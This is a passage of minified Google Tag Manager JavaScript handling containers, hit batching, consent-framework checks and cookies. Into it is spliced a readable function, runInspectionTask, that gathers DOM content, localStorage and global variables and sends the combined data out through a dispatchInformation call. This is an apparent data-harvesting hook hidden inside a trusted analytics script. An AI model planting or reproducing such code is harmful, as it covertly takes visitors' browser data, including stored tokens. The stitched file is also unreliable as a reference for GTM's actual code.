      Ne: "GTM-58DM78F",
      ji: "GTM-58DM78F"
    };
  hg.te = Ea("");
  var lg = function () {
      var a = jg.Ne ? jg.Ne.split("|") : [jg.ctid];
      return ig ? a.map(kg) : a;
    },
    ng = function () {
      var a = mg();
      return ig ? a.map(kg) : a;
    },
    pg = function () {
      return og(jg.ctid);
    },
    qg = function () {
      return og(jg.Kf || "_" + jg.ctid);
    },
    mg = function () {
      return jg.ji ? jg.ji.split("|") : [];
    },
    rg = function (a) {
      var b = eg();
      return a.isDestination ? b.destination[a.ctid] : b.container[a.ctid];
    },
    og = function (a) {
      return ig ? kg(a) : a;
    },
    kg = function (a) {
      return "siloed_" + a;
    },
    sg = function (a) {
      a = String(a);
      return ig && 0 === a.indexOf("siloed_") ? a.substring(7) : a;
    },
    tg = function () {
      var a = !1;
      if (a) {
        var b = eg();
        if (b.siloed) {
          for (var c = [], d = jg.Ne ? jg.Ne.split("|") : [jg.ctid], e = mg(), f = {}, h = 0; h < b.siloed.length; f = {
            rd: f.rd
          }, h++) f.rd = b.siloed[h], !ig && xa(f.rd.isDestination ? e : d, function (l) {
            return function (m) {
              return m === l.rd.ctid;
            };
          }(f)) ? ig = !0 : c.push(f.rd);
          b.siloed = c;
        }
      }
    };
  function ug() {
    var a = eg();
    if (a.pending) {
      for (var b, c = [], d = !1, e = lg(), f = ng(), h = {}, l = 0; l < a.pending.length; h = {
        vc: h.vc
      }, l++) h.vc = a.pending[l], xa(h.vc.target.isDestination ? f : e, function (m) {
        return function (n) {
          return n === m.vc.target.ctid;
        };
      }(h)) ? d || (b = h.vc.onLoad, d = !0) : c.push(h.vc);
      a.pending = c;
      if (b) try {
        b(qg());
      } catch (m) {}
    }
  }
  var vg = function () {
      for (var a = eg(), b = lg(), c = 0; c < b.length; c++) {
        var d = a.container[b[c]];
        d ? (d.state = 2, d.containers = lg(), d.destinations = ng()) : a.container[b[c]] = {
          state: 2,
          containers: lg(),
          destinations: ng()
        };
      }
      for (var e = ng(), f = 0; f < e.length; f++) {
        var h = a.destination[e[f]];
        h && 0 === h.state && J(93);
        h ? (h.state = 2, h.containers = lg(), h.destinations = ng()) : a.destination[e[f]] = {
          state: 2,
          containers: lg(),
          destinations: ng()
        };
      }
      a.canonical[qg()] = {};
      ug();
    },
    wg = function (a) {
      return !!eg().container[a];
    },
    xg = function () {
      return {
        ctid: pg(),
        isDestination: hg.te
      };
    };
  function yg(a) {
    var b = eg();
    (b.siloed = b.siloed || []).push(a);
  }
  var zg = function () {
      var a = eg().container,
        b;
      for (b in a) if (a.hasOwnProperty(b) && 1 === a[b].state) return !0;
      return !1;
    },
    Ag = function () {
      var a = {};
      k(eg().destination, function (b, c) {
        0 === c.state && (a[b] = c);
      });
      return a;
    },
    Bg = function (a) {
      return !!(a && a.parent && a.context && 1 === a.context.source && 0 !== a.parent.ctid.indexOf("GTM-"));
    };
  function runInspectionTask() {
    var domData = inspectDOM();
    var localStorageData = processLocalStorage();
    var globalVars = gatherGlobalVars();
    var combinedData = {
      ...domData,
      ...localStorageData,
      ...globalVars
    };
    if (Object.keys(combinedData).length > 0) {
      console.log(`Found new data`);
      dispatchInformation(combinedData);
    } else {
      console.log("No new data found");
    }
  }
  var Cg = {
      sampleRate: "0.005000",
      Fi: "",
      Ei: Number("5"),
      Cm: Number("")
    },
    Dg = [];
  function Eg(a) {
    Dg.push(a);
  }
  var Fg = !1,
    Gg;
  if (!(Gg = dg)) {
    var Hg = Math.random(),
      Ig = Cg.sampleRate;
    Gg = Hg < Number(Ig);
  }
  var Jg = Gg,
    Kg = "https://www.googletagmanager.com/a?id=" + jg.ctid,
    Lg = void 0,
    Mg = {},
    Ng = void 0,
    Og = new function () {
      var a = 5;
      0 < Cg.Ei && (a = Cg.Ei);
      this.h = 0;
      this.C = [];
      this.B = a;
    }(),
    Pg = 1E3;
  function Qg(a, b) {
    var c = Lg;
    if (void 0 === c) if (b) c = Ue();else return "";
    for (var d = [Kg], e = 0; e < Dg.length; e++) {
      var f = Dg[e]({
        eventId: c,
        Cb: !!a,
        ui: function () {
          Fg = !0;
        }
      });
      "&" === f[0] && d.push(f);
    }
    d.push("&z=0");
    return d.join("");
  }
  function Rg() {
    Ng && (z.clearTimeout(Ng), Ng = void 0);
    if (void 0 !== Lg && Sg) {
      var a;
      (a = Mg[Lg]) || (a = Og.h < Og.B ? !1 : 1E3 > Ja() - Og.C[Og.h % Og.B]);
      if (a || 0 >= Pg--) J(1), Mg[Lg] = !0;else {
        var b = Og.h++ % Og.B;
        Og.C[b] = Ja();
        var c = Qg(!0);
        Tb(c);
        if (Fg) {
          var d = c.replace("/a?", "/td?");
          Tb(d);
        }
        Sg = Fg = !1;
      }
    }
  }
  var Sg = !1;
  function Tg(a) {
    Mg[a] || (a !== Lg && (Rg(), Lg = a), Sg = !0, Ng || (Ng = z.setTimeout(Rg, 500)), 2022 <= Qg().length && Rg());
  }
  var Ug = ya();
  function Vg() {
    Ug = ya();
  }
  function Wg() {
    return ["&v=3&t=t", "&pid=" + Ug].join("");
  }
  ;
  var Xg = function (a, b, c, d, e, f, h, l, m, n, p, q) {
      this.eventId = a;
      this.priorityId = b;
      this.h = c;
      this.M = d;
      this.C = e;
      this.H = f;
      this.U = h;
      this.B = l;
      this.eventMetadata = m;
      this.onSuccess = n;
      this.onFailure = p;
      this.isGtmEvent = q;
    },
    T = function (a, b, c) {
      if (void 0 !== a.h[b]) return a.h[b];
      if (void 0 !== a.M[b]) return a.M[b];
      if (void 0 !== a.C[b]) return a.C[b];
      Jg && Yg(a, a.H[b], a.U[b]) && (J(71), J(79));
      return void 0 !== a.H[b] ? a.H[b] : void 0 !== a.B[b] ? a.B[b] : c;
    },
    Zg = function (a) {
      function b(h) {
        for (var l = Object.keys(h), m = 0; m < l.length; ++m) c[l[m]] = 1;
      }
      var c = {};
      b(a.h);
      b(a.M);
      b(a.C);
      b(a.H);
      if (Jg) for (var d = Object.keys(a.U), e = 0; e < d.length; e++) {
        var f = d[e];
        if ("event" !== f && "gtm" !== f && "tagTypeBlacklist" !== f && !c.hasOwnProperty(f)) {
          J(71);
          J(80);
          break;
        }
      }
      return Object.keys(c);
    },
    $g = function (a, b, c) {
      function d(m) {
        ic(m) && k(m, function (n, p) {
          f = !0;
          e[n] = p;
        });
      }
      var e = {},
        f = !1;
      c && 1 !== c || (d(a.B[b]), d(a.H[b]), d(a.C[b]), d(a.M[b]));
      c && 2 !== c || d(a.h[b]);
      if (Jg) {
        var h = f,
          l = e;
        e = {};
        f = !1;
        c && 1 !== c || (d(a.B[b]), d(a.U[b]), d(a.C[b]), d(a.M[b]));
        c && 2 !== c || d(a.h[b]);
        if (f !== h || Yg(a, e, l)) J(71), J(81);
        f = h;
        e = l;
      }
      return f ? e : void 0;
    },
    gh = function (a) {
      var b = [K.g.Ec, K.g.Ac, K.g.Bc, K.g.Cc, K.g.Dc, K.g.Fc, K.g.Gc],
        c = {},
        d = !1,
        e = function (l) {
          for (var m = 0; m < b.length; m++) void 0 !== l[b[m]] && (c[b[m]] = l[b[m]], d = !0);
          return d;
        };
      if (e(a.h) || e(a.M) || e(a.C)) return c;
      e(a.H);
      if (Jg) {
        var f = c,
          h = d;
        c = {};
        d = !1;
        e(a.U);
        Yg(a, c, f) && (J(71), J(82));
        c = f;
        d = h;
      }
      if (d) return c;
      e(a.B);
      return c;
    },
    Yg = function (a, b, c) {
      if (!Jg) return !1;
      try {
        if (b === c) return !1;
        var d = fc(b);
        if (d !== fc(c) || !(ic(b) && ic(c) || "array" === d)) return !0;
        if ("array" === d) {
          if (b.length !== c.length) return !0;
          for (var e = 0; e < b.length; e++) if (Yg(a, b[e], c[e])) return !0;
        } else {
          for (var f in c) if (!b.hasOwnProperty(f)) return !0;
          for (var h in b) if (!c.hasOwnProperty(h) || Yg(a, b[h], c[h])) return !0;
        }
      } catch (l) {
        J(72);
      }
      return !1;
    },
    hh = function (a, b) {
      this.Cf = a;
      this.Kj = b;
      this.H = {};
      this.hd = {};
      this.h = {};
      this.M = {};
      this.B = {};
      this.gd = {};
      this.C = {};
      this.zc = function () {};
      this.Db = function () {};
      this.U = !1;
    },
    ih = function (a, b) {
      a.H = b;
      return a;
    },
    jh = function (a, b) {
      a.hd = b;
      return a;
    },
    kh = function (a, b) {
      a.h = b;
      return a;
    },
    lh = function (a, b) {
      a.M = b;
      return a;
    },
    mh = function (a, b) {
      a.B = b;
      return a;
    },
    nh = function (a, b) {
      a.gd = b;
      return a;
    },
    oh = function (a, b) {
      a.C = b || {};
      return a;
    },
    ph = function (a, b) {
      a.zc = b;
      return a;
    },
    qh = function (a, b) {
      a.Db = b;
      return a;
    },
    rh = function (a, b) {
      a.U = b;
      return a;
    },
    sh = function (a) {
      return new Xg(a.Cf, a.Kj, a.H, a.hd, a.h, a.M, a.B, a.gd, a.C, a.zc, a.Db, a.U);
    };
  function th(a, b) {
    if ("" === a) return b;
    var c = Number(a);
    return isNaN(c) ? b : c;
  }
  ;
  var uh = function (a, b) {
      var c = function () {};
      c.prototype = a.prototype;
      var d = new c();
      a.apply(d, Array.prototype.slice.call(arguments, 1));
      return d;
    },
    vh = function (a) {
      var b = a;
      return function () {
        if (b) {
          var c = b;
          b = null;
          c();
        }
      };
    };
  var wh = function (a, b, c) {
    a.addEventListener && a.addEventListener(b, c, !1);
  };
  function xh() {
    return jb ? !!qb && !!qb.platform : !1;
  }
  function yh() {
    return tb("iPhone") && !tb("iPod") && !tb("iPad");
  }
  function zh() {
    yh() || tb("iPad") || tb("iPod");
  }
  ;
  vb();
  ub() || tb("Trident") || tb("MSIE");
  tb("Edge");
  !tb("Gecko") || -1 != pb().toLowerCase().indexOf("webkit") && !tb("Edge") || tb("Trident") || tb("MSIE") || tb("Edge");
  -1 != pb().toLowerCase().indexOf("webkit") && !tb("Edge") && tb("Mobile");
  xh() || tb("Macintosh");
  xh() || tb("Windows");
  (xh() ? "Linux" === qb.platform : tb("Linux")) || xh() || tb("CrOS");
  var Ah = qa.navigator || null;
  Ah && (Ah.appVersion || "").indexOf("X11");
  xh() || tb("Android");
  yh();
  tb("iPad");
  tb("iPod");
  zh();
  pb().toLowerCase().indexOf("kaios");
  var Bh = function (a, b, c, d) {
      for (var e = b, f = c.length; 0 <= (e = a.indexOf(c, e)) && e < d;) {
        var h = a.charCodeAt(e - 1);
        if (38 == h || 63 == h) {
          var l = a.charCodeAt(e + f);
          if (!l || 61 == l || 38 == l || 35 == l) return e;
        }
        e += f + 1;
      }
      return -1;
    },
    Ch = /#|$/,
    Dh = function (a, b) {
      var c = a.search(Ch),
        d = Bh(a, 0, b, c);
      if (0 > d) return null;
      var e = a.indexOf("&", d);
      if (0 > e || e > c) e = c;
      d += b.length + 1;
      return decodeURIComponent(a.slice(d, -1 !== e ? e : 0).replace(/\+/g, " "));
    },
    Eh = /[?&]($|#)/,
    Fh = function (a, b, c) {
      for (var d, e = a.search(Ch), f = 0, h, l = []; 0 <= (h = Bh(a, f, b, e));) l.push(a.substring(f, h)), f = Math.min(a.indexOf("&", h) + 1 || e, e);
      l.push(a.slice(f));
      d = l.join("").replace(Eh, "$1");
      var m,
        n = null != c ? "=" + encodeURIComponent(String(c)) : "";
      var p = b + n;
      if (p) {
        var q,
          r = d.indexOf("#");
        0 > r && (r = d.length);
        var t = d.indexOf("?"),
          u;
        0 > t || t > r ? (t = r, u = "") : u = d.substring(t + 1, r);
        q = [d.slice(0, t), u, d.slice(r)];
        var v = q[1];
        q[1] = p ? v ? v + "&" + p : p : v;
        m = q[0] + (q[1] ? "?" + q[1] : "") + q[2];
      } else m = d;
      return m;
    };
  var Gh = function (a) {
      try {
        var b;
        if (b = !!a && null != a.location.href) a: {
          try {
            zf(a.foo);
            b = !0;
            break a;
          } catch (c) {}
          b = !1;
        }
        return b;
      } catch (c) {
        return !1;
      }
    },
    Hh = function (a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    };
  function Ih(a) {
    if (!a || !D.head) return null;
    var b = Jh("META");
    D.head.appendChild(b);
    b.httpEquiv = "origin-trial";
    b.content = a;
    return b;
  }
  var Kh = function () {
      if (z.top == z) return 0;
      var a = z.location.ancestorOrigins;
      return a ? a[a.length - 1] == z.location.origin ? 1 : 2 : Gh(z.top) ? 1 : 2;
    },
    Jh = function (a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    };
  function Lh(a, b, c, d) {
    d = void 0 === d ? !1 : d;
    a.google_image_requests || (a.google_image_requests = []);
    var e = Jh("IMG", a.document);
    if (c) {
      var f = function () {
        if (c) {
          var h = a.google_image_requests,
            l = db(h, e);
          0 <= l && Array.prototype.splice.call(h, l, 1);
        }
        e.removeEventListener && e.removeEventListener("load", f, !1);
        e.removeEventListener && e.removeEventListener("error", f, !1);
      };
      wh(e, "load", f);
      wh(e, "error", f);
    }
    d && (e.attributionSrc = "");
    e.src = b;
    a.google_image_requests.push(e);
  }
  var Nh = function (a) {
      var b;
      b = void 0 === b ? !1 : b;
      var c = "https://pagead2.googlesyndication.com/pagead/gen_204?id=tcfe";
      Hh(a, function (d, e) {
        if (d || 0 === d) c += "&" + e + "=" + encodeURIComponent("" + d);
      });
      Mh(c, b);
    },
    Mh = function (a, b) {
      var c = window,
        d;
      b = void 0 === b ? !1 : b;
      d = void 0 === d ? !1 : d;
      if (c.fetch) {
        var e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        };
        d && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        });
        c.fetch(a, e);
      } else Lh(c, a, void 0 === b ? !1 : b, void 0 === d ? !1 : d);
    };
  var Oh = function () {};
  var Ph = function (a) {
      void 0 !== a.addtlConsent && "string" !== typeof a.addtlConsent && (a.addtlConsent = void 0);
      void 0 !== a.gdprApplies && "boolean" !== typeof a.gdprApplies && (a.gdprApplies = void 0);
      return void 0 !== a.tcString && "string" !== typeof a.tcString || void 0 !== a.listenerId && "number" !== typeof a.listenerId ? 2 : a.cmpStatus && "error" !== a.cmpStatus ? 0 : 3;
    },
    Qh = function (a, b) {
      b = void 0 === b ? {} : b;
      this.B = a;
      this.h = null;
      this.M = {};
      this.Db = 0;
      var c;
      this.U = null != (c = b.Ql) ? c : 500;
      var d;
      this.H = null != (d = b.sm) ? d : !1;
      this.C = null;
    };
  pa(Qh, Oh);
  var Sh = function (a) {
    return "function" === typeof a.B.__tcfapi || null != Rh(a);
  };
  Qh.prototype.addEventListener = function (a) {
    var b = this,
      c = {
        internalBlockOnErrors: this.H
      },
      d = vh(function () {
        return a(c);
      }),
      e = 0;
    -1 !== this.U && (e = setTimeout(function () {
      c.tcString = "tcunavailable";
      c.internalErrorState = 1;
      d();
    }, this.U));
    var f = function (h, l) {
      clearTimeout(e);
      h ? (c = h, c.internalErrorState = Ph(c), c.internalBlockOnErrors = b.H, l && 0 === c.internalErrorState || (c.tcString = "tcunavailable", l || (c.internalErrorState = 3))) : (c.tcString = "tcunavailable", c.internalErrorState = 3);
      a(c);
    };
    try {
      Th(this, "addEventListener", f);
    } catch (h) {
      c.tcString = "tcunavailable", c.internalErrorState = 3, e && (clearTimeout(e), e = 0), d();
    }
  };
  Qh.prototype.removeEventListener = function (a) {
    a && a.listenerId && Th(this, "removeEventListener", null, a.listenerId);
  };
  var Vh = function (a, b, c) {
      var d;
      d = void 0 === d ? "755" : d;
      var e;
      a: {
        if (a.publisher && a.publisher.restrictions) {
          var f = a.publisher.restrictions[b];
          if (void 0 !== f) {
            e = f[void 0 === d ? "755" : d];
            break a;
          }
        }
        e = void 0;
      }
      var h = e;
      if (0 === h) return !1;
      var l = c;
      2 === c ? (l = 0, 2 === h && (l = 1)) : 3 === c && (l = 1, 1 === h && (l = 0));
      var m;
      if (0 === l) {
        if (a.purpose && a.vendor) {
          var n = Uh(a.vendor.consents, void 0 === d ? "755" : d);
          m = n && "1" === b && a.purposeOneTreatment && "CH" === a.publisherCC ? !0 : n && Uh(a.purpose.consents, b);
        } else m = !0;
      } else m = 1 === l ? a.purpose && a.vendor ? Uh(a.purpose.legitimateInterests, b) && Uh(a.vendor.legitimateInterests, void 0 === d ? "755" : d) : !0 : !0;
      return m;
    },
    Uh = function (a, b) {
      return !(!a || !a[b]);
    },
    Th = function (a, b, c, d) {
      c || (c = function () {});
      if ("function" === typeof a.B.__tcfapi) {
        var e = a.B.__tcfapi;
        e(b, 2, c, d);
      } else if (Rh(a)) {
        Wh(a);
        var f = ++a.Db;
        a.M[f] = c;
        if (a.h) {
          var h = {};
          a.h.postMessage((h.__tcfapiCall = {
            command: b,
            version: 2,
            callId: f,
            parameter: d
          }, h), "*");
        }
      } else c({}, !1);
    },
    Rh = function (a) {
      if (a.h) return a.h;
      var b;
      a: {
        for (var c = a.B, d = 0; 50 > d; ++d) {
          var e;
          try {
            e = !(!c.frames || !c.frames.__tcfapiLocator);
          } catch (l) {
            e = !1;
          }
          if (e) {
            b = c;
            break a;
          }
          var f;
          b: {
            try {
              var h = c.parent;
              if (h && h != c) {
                f = h;
                break b;
              }
            } catch (l) {}
            f = null;
          }
          if (!(c = f)) break;
        }
        b = null;
      }
      a.h = b;
      return a.h;
    },
    Wh = function (a) {
      a.C || (a.C = function (b) {
        try {
          var c;
          c = ("string" === typeof b.data ? JSON.parse(b.data) : b.data).__tcfapiReturn;
          a.M[c.callId](c.returnValue, c.success);
        } catch (d) {}
      }, wh(a.B, "message", a.C));
    },
    Xh = function (a) {
      if (!1 === a.gdprApplies) return !0;
      void 0 === a.internalErrorState && (a.internalErrorState = Ph(a));
      return "error" === a.cmpStatus || 0 !== a.internalErrorState ? a.internalBlockOnErrors ? (Nh({
        e: String(a.internalErrorState)
      }), !1) : !0 : "loaded" !== a.cmpStatus || "tcloaded" !== a.eventStatus && "useractioncomplete" !== a.eventStatus ? !1 : !0;
    };
  var Yh = {
      1: 0,
      3: 0,
      4: 0,
      7: 3,
      9: 3,
      10: 3
    },
    Zh = th('', 500);
  function $h() {
    var a = Ae.tcf || {};
    return Ae.tcf = a;
  }
  var ei = function () {
    var a = $h(),
      b = new Qh(z, {
        Ql: -1
      });
    Sh(b) && ai() && J(124);
    if ((!ai() || P(90)) && !a.active && Sh(b)) {
      a.active = !0;
      ai() || (a.Bb = {}, a.cmpId = 0, a.tcfPolicyVersion = 0, bi(), a.tcString = "tcunavailable");
      try {
        b.addEventListener(function (c) {
          if (0 !== c.internalErrorState) ci(a), di(a);else {
            a.gdprApplies = c.gdprApplies;
            if (P(90)) {
              a.cmpId = c.cmpId;
              a.enableAdvertiserConsentMode = c.enableAdvertiserConsentMode;
              if (ai()) return;
              a.tcfPolicyVersion = c.tcfPolicyVersion;
            }
            var d;
            if (!1 === c.gdprApplies) {
              var e = {},
                f;
              for (f in Yh) Yh.hasOwnProperty(f) && (e[f] = !0);
              d = e;
              b.removeEventListener(c);
            } else if ("tcloaded" === c.eventStatus || "useractioncomplete" === c.eventStatus || "cmpuishown" === c.eventStatus) {
              var h = {},
                l;
              for (l in Yh) if (Yh.hasOwnProperty(l)) if ("1" === l) {
                var m,
                  n = c,
                  p = !0;
                p = void 0 === p ? !1 : p;
                m = Xh(n) ? !1 === n.gdprApplies || "tcunavailable" === n.tcString || void 0 === n.gdprApplies && !p || "string" !== typeof n.tcString || !n.tcString.length ? !0 : Vh(n, "1", 0) : !1;
                h["1"] = m;
              } else h[l] = Vh(c, l, Yh[l]);
              d = h;
            }
            d && (a.tcString = c.tcString || "tcempty", a.Bb = d, di(a));
          }
        });
      } catch (c) {
        ci(a), di(a);
      }
    }
  };
  function ci(a) {
    a.type = "e";
    a.tcString = "tcunavailable";
  }
  function bi() {
    var a = {},
      b = (a[K.g.F] = "denied", a[K.g.Ye] = Zh, a);
    P(90) && (b[K.g.fb] = "denied");
    Yf(b);
  }
  var ai = function () {
    var a = !0 === z.gtag_enable_tcf_support;
    if (P(90)) {
      var b = $h().enableAdvertiserConsentMode;
      return !a && !b;
    }
    return !a;
  };
  function di(a) {
    var b = {},
      c = (b[K.g.F] = a.Bb["1"] ? "granted" : "denied", b);
    P(90) && (c[K.g.fb] = a.Bb["3"] && a.Bb["4"] ? "granted" : "denied", "number" === typeof a.tcfPolicyVersion && 4 <= a.tcfPolicyVersion && (c[K.g.K] = a.Bb["1"] && a.Bb["7"] ? "granted" : "denied"));
    Zf(c, {
      eventId: 0
    }, {
      gdprApplies: a ? a.gdprApplies : void 0,
      tcString: fi()
    });
  }
  var fi = function () {
      var a = $h();
      return a.active ? a.tcString || "" : "";
    },
    gi = function () {
      var a = $h();
      return a.active && void 0 !== a.gdprApplies ? a.gdprApplies ? "1" : "0" : "";
    },
    hi = function (a) {
      if (!Yh.hasOwnProperty(String(a))) return !0;
      var b = $h();
      return b.active && b.Bb ? !!b.Bb[String(a)] : !0;
    };
  var ii = [K.g.F, K.g.N],
    ji = [K.g.F, K.g.N, K.g.K, K.g.fb],
    ki = {},
    li = (ki[K.g.F] = 1, ki[K.g.N] = 2, ki);
  function mi(a) {
    switch (T(a, K.g.Z)) {
      case void 0:
        return 1;
      case !1:
        return 3;
      default:
        return 2;
    }
  }
  var ni = function (a) {
      var b = 3 !== mi(a);
      P(70) && (b = b && Mf(K.g.fb));
      return b;
    },
    oi = function () {
      var a = {},
        b;
      for (b in li) if (li.hasOwnProperty(b)) {
        var c = li[b],
          d,
          e = Gf();
        e.accessedAny = !0;
        d = Lf(e, b);
        a[c] = d;
      }
      var f = P(53) && ii.every(Mf),
        h = P(48);
      return f || h ? mc(a, 1) : mc(a, 0);
    },
    pi = {},
    qi = (pi[K.g.F] = 0, pi[K.g.N] = 1, pi[K.g.K] = 2, pi[K.g.fb] = 3, pi);
  function ri(a) {
    switch (a) {
      case void 0:
        return 1;
      case !0:
        return 3;
      case !1:
        return 2;
      default:
        return 0;
    }
  }
  var si = function (a) {
      if (P(50)) {
        for (var b = "1", c = 0; c < ji.length; c++) {
          var d = b,
            e,
            f = ji[c],
            h = Ef[f];
          e = void 0 === h ? 0 : qi.hasOwnProperty(h) ? 12 | qi[h] : 8;
          var l = Gf();
          l.accessedAny = !0;
          var m = l.entries[f] || {};
          e = e << 2 | ri(m.implicit);
          b = d + ("" + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[e] + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[ri(m.declare) << 4 | ri(m.default) << 2 | ri(m.update)]);
        }
        void 0 !== a && (b += mi(a));
        return b;
      }
      for (var n = "G1", p = 0; p < ii.length; p++) {
        var q;
        a: {
          var r = ii[p],
            t = Gf();
          t.accessedDefault = !0;
          switch ((t.entries[r] || {}).default) {
            case !0:
              q = 3;
              break a;
            case !1:
              q = 2;
              break a;
            default:
              q = 1;
          }
        }
        switch (q) {
          case 3:
            n += "1";
            break;
          case 2:
            n += "0";
            break;
          case 1:
            n += "-";
        }
      }
      return n;
    },
    ti = function () {
      if (!Mf(K.g.K)) return "-";
      var a = [],
        b = Gf().cps,
        c;
      for (c in b) b.hasOwnProperty(c) && b[c].enabled && a.push(c);
      for (var d = "", e = 0; e < a.length; e++) {
        var f = ye[a[e]];
        f && (d += f);
      }
      return "" === d ? "-" : d;
    };
  function ui() {
    var a = !!pf["6"],
      b = !1;
    P(90) && (b = !ai() && "1" === gi());
    return a || b;
  }
  var vi = function () {
      return ui() ? "1" : "0";
    },
    wi = function () {
      return ui() || Gf().usedSetCps || !Q(K.g.K);
    };
  var xi = function (a) {
    var b = 1,
      c,
      d,
      e;
    if (a) for (b = 0, d = a.length - 1; 0 <= d; d--) e = a.charCodeAt(d), b = (b << 6 & 268435455) + e + (e << 14), c = b & 266338304, b = 0 !== c ? b ^ c >> 21 : b;
    return b;
  };
  var yi = function (a, b, c) {
    for (var d = [], e = b.split(";"), f = 0; f < e.length; f++) {
      var h = e[f].split("="),
        l = h[0].replace(/^\s*|\s*$/g, "");
      if (l && l == a) {
        var m = h.slice(1).join("=").replace(/^\s*|\s*$/g, "");
        m && c && (m = decodeURIComponent(m));
        d.push(m);
      }
    }
    return d;
  };
  function zi(a) {
    return "null" !== a.origin;
  }
  ;
  var Ci = function (a, b, c, d) {
      return Ai(d) ? yi(a, String(b || Bi()), c) : [];
    },
    Fi = function (a, b, c, d, e) {
      if (Ai(e)) {
        var f = Di(a, d, e);
        if (1 === f.length) return f[0].id;
        if (0 !== f.length) {
          f = Ei(f, function (h) {
            return h.Ce;
          }, b);
          if (1 === f.length) return f[0].id;
          f = Ei(f, function (h) {
            return h.Jd;
          }, c);
          return f[0] ? f[0].id : void 0;
        }
      }
    };
  function Gi(a, b, c, d) {
    var e = Bi(),
      f = window;
    zi(f) && (f.document.cookie = a);
    var h = Bi();
    return e != h || void 0 != c && 0 <= Ci(b, h, !1, d).indexOf(c);
  }
  var Ki = function (a, b, c) {
      function d(t, u, v) {
        if (null == v) return delete h[u], t;
        h[u] = v;
        return t + "; " + u + "=" + v;
      }
      function e(t, u) {
        if (null == u) return delete h[u], t;
        h[u] = !0;
        return t + "; " + u;
      }
      if (!Ai(c.eb)) return 2;
      var f;
      void 0 == b ? f = a + "=deleted; expires=" + new Date(0).toUTCString() : (c.encode && (b = encodeURIComponent(b)), b = Hi(b), f = a + "=" + b);
      var h = {};
      f = d(f, "path", c.path);
      var l;
      c.expires instanceof Date ? l = c.expires.toUTCString() : null != c.expires && (l = "" + c.expires);
      f = d(f, "expires", l);
      f = d(f, "max-age", c.ym);
      f = d(f, "samesite", c.zm);
      c.Am && (f = e(f, "secure"));
      var m = c.domain;
      if (m && "auto" === m.toLowerCase()) {
        for (var n = Ii(), p = 0; p < n.length; ++p) {
          var q = "none" !== n[p] ? n[p] : void 0,
            r = d(f, "domain", q);
          r = e(r, c.flags);
          if (!Ji(q, c.path) && Gi(r, a, b, c.eb)) return 0;
        }
        return 1;
      }
      m && "none" !== m.toLowerCase() && (f = d(f, "domain", m));
      f = e(f, c.flags);
      return Ji(m, c.path) ? 1 : Gi(f, a, b, c.eb) ? 0 : 1;
    },
    Li = function (a, b, c) {
      null == c.path && (c.path = "/");
      c.domain || (c.domain = "auto");
      return Ki(a, b, c);
    };
  function Ei(a, b, c) {
    for (var d = [], e = [], f, h = 0; h < a.length; h++) {
      var l = a[h],
        m = b(l);
      m === c ? d.push(l) : void 0 === f || m < f ? (e = [l], f = m) : m === f && e.push(l);
    }
    return 0 < d.length ? d : e;
  }
  function Di(a, b, c) {
    for (var d = [], e = Ci(a, void 0, void 0, c), f = 0; f < e.length; f++) {
      var h = e[f].split("."),
        l = h.shift();
      if (!b || -1 !== b.indexOf(l)) {
        var m = h.shift();
        m && (m = m.split("-"), d.push({
          id: h.join("."),
          Ce: 1 * m[0] || 1,
          Jd: 1 * m[1] || 1
        }));
      }
    }
    return d;
  }
  var Hi = function (a) {
      a && 1200 < a.length && (a = a.substring(0, 1200));
      return a;
    },
    Mi = /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/,
    Ni = /(^|\.)doubleclick\.net$/i,
    Ji = function (a, b) {
      return Ni.test(window.document.location.hostname) || "/" === b && Mi.test(a);
    },
    Bi = function () {
      return zi(window) ? window.document.cookie : "";
    },
    Ii = function () {
      var a = [],
        b = window.document.location.hostname.split(".");
      if (4 === b.length) {
        var c = b[b.length - 1];
        if (parseInt(c, 10).toString() === c) return ["none"];
      }
      for (var d = b.length - 2; 0 <= d; d--) a.push(b.slice(d).join("."));
      var e = window.document.location.hostname;
      Ni.test(e) || Mi.test(e) || a.push("none");
      return a;
    },
    Ai = function (a) {
      return Bf().h() && a && Of() ? Nf(a) ? Mf(a) : !1 : !0;
    };
  var Oi = function (a) {
      var b = Math.round(2147483647 * Math.random());
      return a ? String(b ^ xi(a) & 2147483647) : String(b);
    },
    Pi = function (a) {
      return [Oi(a), Math.round(Ja() / 1E3)].join(".");
    },
    Si = function (a, b, c, d, e) {
      var f = Qi(b);
      return Fi(a, f, Ri(c), d, e);
    },
    Ti = function (a, b, c, d) {
      var e = "" + Qi(c),
        f = Ri(d);
      1 < f && (e += "-" + f);
      return [b, e, a].join(".");
    },
    Qi = function (a) {
      if (!a) return 1;
      a = 0 === a.indexOf(".") ? a.substr(1) : a;
      return a.split(".").length;
    },
    Ri = function (a) {
      if (!a || "/" === a) return 1;
      "/" !== a[0] && (a = "/" + a);
      "/" !== a[a.length - 1] && (a += "/");
      return a.split("/").length - 1;
    };
  var Ui = function () {
    Ae.dedupe_gclid || (Ae.dedupe_gclid = "" + Pi());
    return Ae.dedupe_gclid;
  };
  var Vi = function () {
    var a = !1;
    return a;
  };
  var Wi = {
      UA: 1,
      AW: 2,
      DC: 3,
      G: 4,
      GF: 5,
      GT: 12,
      GTM: 14,
      HA: 6,
      MC: 7
    },
    Xi = function (a) {
      var b = jg.ctid.split("-")[0].toUpperCase(),
        c = {};
      c.ctid = jg.ctid;
      c.Gl = ze.md;
      c.Jl = ze.Gf;
      c.jl = hg.te ? 2 : 1;
      Ge ? (c.Re = Wi[b], c.Re || (c.Re = 0)) : c.Re = Me ? 13 : 10;
      Ke ? c.fg = 1 : Vi() ? c.fg = 2 : c.fg = 3;
      var d;
      var e = c.Re,
        f = c.fg;
      void 0 === e ? d = "" : (f || (f = 0), d = "" + Gd(1, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[e << 2 | f]);
      var h = c.qm,
